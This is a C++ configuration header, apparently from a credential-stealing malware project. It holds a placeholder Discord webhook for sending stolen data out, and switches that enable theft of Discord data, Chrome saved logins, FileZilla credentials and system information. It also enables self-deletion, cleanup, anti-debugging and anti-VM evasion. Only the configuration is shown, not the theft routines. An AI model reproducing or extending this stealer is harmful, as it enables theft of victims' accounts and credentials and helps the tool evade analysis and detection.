#pragma once

#include <iostream>
#include <windows.h>
#include <unordered_map>
#include <wincrypt.h>

using umss = std::unordered_map<std::string, std::string>;
using vs = std::vector<std::string>;
using vdb = std::vector<DATA_BLOB>;

namespace config
{
	//Place your discord webhook here
	constexpr inline char webhook[]		= "REPLACE WITH UR OWN WEBHOOK!";

	//Configs to toggle different functionality
	constexpr inline bool discord		= true;
	constexpr inline bool chrome_logins	= true;
	constexpr inline bool filezilla		= true;
	constexpr inline bool system		= true;

	//idk why you'd want to turn these off but you can...
	constexpr inline bool cleanup		= true;
	constexpr inline bool selfdelete	= true;

	constexpr inline bool antidebug		= true;
	constexpr inline bool antivm		= true;
};